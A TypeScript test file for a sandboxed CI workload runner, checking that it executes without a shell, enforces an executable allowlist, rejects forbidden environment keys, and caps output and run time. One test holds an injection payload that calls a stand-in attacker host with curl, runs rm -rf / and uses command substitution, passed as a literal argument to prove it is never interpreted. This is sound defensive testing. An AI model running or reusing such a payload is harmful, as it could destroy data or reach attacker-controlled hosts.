/**
 * Real, live tests of ops/runner-agent/workload-runner.cjs - the actual file that gets embedded and
 * run inside a real Cloudflare Sandbox container. These tests invoke the REAL .cjs file as a real
 * subprocess (node ops/runner-agent/workload-runner.cjs <spec-file>), not a reimplementation - the
 * exact same code path production uses. uid/gid drop-privilege behavior is POSIX-only and cannot be
 * verified on this Windows dev machine (Node silently ignores uid/gid on win32) - that specific
 * property is verified separately, live, inside the real deployed container (R2 Part 6's own evidence).
 */
import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { execFileSync } from "node:child_process";
import { writeFileSync, rmSync, mkdtempSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";

const REPO_ROOT = fileURLToPath(new URL("../..", import.meta.url));
const WORKLOAD_RUNNER = join(REPO_ROOT, "ops", "runner-agent", "workload-runner.cjs");

function runWorkloadRunner(spec: unknown): { steps: Array<{ executable: string; exitCode: number | null; signal: string | null; timedOut: boolean; outputTruncated: boolean; durationMs: number; stdout: string; stderr: string }>; failedAtStep: number | null; fatalError?: string } {
  const dir = mkdtempSync(join(tmpdir(), "diffci-workload-runner-test-"));
  const specPath = join(dir, "spec.json");
  try {
    writeFileSync(specPath, JSON.stringify(spec));
    try {
      const stdout = execFileSync("node", [WORKLOAD_RUNNER, specPath], { encoding: "utf8" });
      return JSON.parse(stdout);
    } catch (err) {
      // A fatal validation error (e.g. disallowed executable) makes workload-runner.cjs exit non-zero
      // - execFileSync throws in that case, but the real JSON result is still on the child's stdout.
      const stdout = (err as { stdout?: string }).stdout;
      if (stdout) return JSON.parse(stdout);
      throw err;
    }
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

function baseSpec(steps: Array<{ executable: string; args: string[]; cwd?: string }>, overrides: Record<string, unknown> = {}) {
  return { steps, env: { PATH: process.env.PATH }, uid: null, gid: null, timeoutMsPerStep: 5000, maxOutputBytes: 65_536, ...overrides };
}

describe("workload-runner.cjs - Part 3 real non-shell execution", () => {
  it("real proof: an injection-shaped argument arrives as a single literal argv element - no shell is ever invoked", () => {
    const payload = "; curl http://attacker.example/pwned && rm -rf / | cat > /tmp/pwned $(whoami) `id`";
    const result = runWorkloadRunner(baseSpec([{ executable: "node", args: ["-e", "console.log(JSON.stringify(process.argv.slice(1)))", payload] }]));
    assert.equal(result.steps[0]!.exitCode, 0);
    const argv = JSON.parse(result.steps[0]!.stdout.trim());
    assert.deepEqual(argv, [payload]);
  });

  it("multiple steps run in order and all succeed", () => {
    const result = runWorkloadRunner(baseSpec([{ executable: "node", args: ["-e", "console.log('one')"] }, { executable: "node", args: ["-e", "console.log('two')"] }]));
    assert.equal(result.steps.length, 2);
    assert.equal(result.steps[0]!.stdout.trim(), "one");
    assert.equal(result.steps[1]!.stdout.trim(), "two");
    assert.equal(result.failedAtStep, null);
  });

  it("a failing NON-LAST step stops the sequence - later steps never run", () => {
    const result = runWorkloadRunner(baseSpec([{ executable: "node", args: ["-e", "process.exit(1)"] }, { executable: "node", args: ["-e", "console.log('should-never-run')"] }]));
    assert.equal(result.steps.length, 1);
    assert.equal(result.failedAtStep, 0);
  });

  it("a failing LAST step (the real test command) is reported normally, not treated as a setup failure", () => {
    const result = runWorkloadRunner(baseSpec([{ executable: "node", args: ["-e", "console.log('setup-ok')"] }, { executable: "node", args: ["-e", "process.exit(1)"] }]));
    assert.equal(result.steps.length, 2);
    assert.equal(result.steps[1]!.exitCode, 1);
    assert.equal(result.failedAtStep, null, "the final step's own failure is the job's real result, not a pipeline abort");
  });

  it("rejects an executable outside the allowlist as a real, standalone backstop (not just trusting the caller already validated)", () => {
    const result = runWorkloadRunner(baseSpec([{ executable: "bash", args: ["-c", "echo hi"] }]));
    assert.equal(result.fatalError && result.fatalError.includes("not in the allowlist"), true);
  });

  it("rejects a forbidden-shaped env key even if somehow present in the (should-already-be-sanitized) env", () => {
    const result = runWorkloadRunner(baseSpec([{ executable: "node", args: ["-e", "1"] }], { env: { PATH: process.env.PATH, RUNNER_CONTROL_TOKEN: "leaked" } }));
    assert.equal(result.fatalError && result.fatalError.includes("forbidden"), true);
  });
});

describe("workload-runner.cjs - Part 19 output limits", () => {
  it("truncates stdout at the configured cap and kills the process rather than letting it run unbounded", () => {
    const result = runWorkloadRunner(baseSpec([{ executable: "node", args: ["-e", "for(let i=0;i<100000;i++)process.stdout.write('x'.repeat(100))"] }], { maxOutputBytes: 1000 }));
    assert.equal(result.steps[0]!.outputTruncated, true);
    assert.ok(result.steps[0]!.stdout.length <= 1000);
    assert.equal(result.steps[0]!.signal, "SIGKILL");
  });
});

describe("workload-runner.cjs - Part 20 execution timeout", () => {
  it("kills a hanging process at the configured timeout - real wall-clock proof, not just a reported flag", () => {
    const start = Date.now();
    const result = runWorkloadRunner(baseSpec([{ executable: "node", args: ["-e", "setTimeout(()=>{}, 60000)"] }], { timeoutMsPerStep: 1200 }));
    const elapsedMs = Date.now() - start;
    assert.equal(result.steps[0]!.timedOut, true);
    assert.equal(result.steps[0]!.signal, "SIGKILL");
    assert.ok(elapsedMs < 10_000, `must not actually wait for the real 60s sleep - took ${elapsedMs}ms`);
  });
});
